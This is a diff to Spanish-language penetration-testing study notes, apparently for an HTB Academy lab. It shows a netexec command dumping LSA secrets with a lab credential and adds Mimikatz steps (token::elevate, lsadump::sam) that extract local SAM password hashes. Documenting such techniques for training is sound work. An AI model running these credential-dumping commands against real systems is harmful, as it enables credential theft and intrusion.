@@ -63,3 +63,15 @@ Con acceso administrador se pueden atacar a los secretos LSA a través de la red
 ```bash
 netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
 ```
+
+### Extracción hashes cuentas locales SAM con Mimikatz
+```powershell
+./mimikatz.exe
+
+// 1. Elevar privilegios al nivel de SYSTEM para acceder a los ficheros protegidos
+token::elevate
+
+// 2. Extraer los hashes del fichero SAM
+lsadump::sam
+
+```
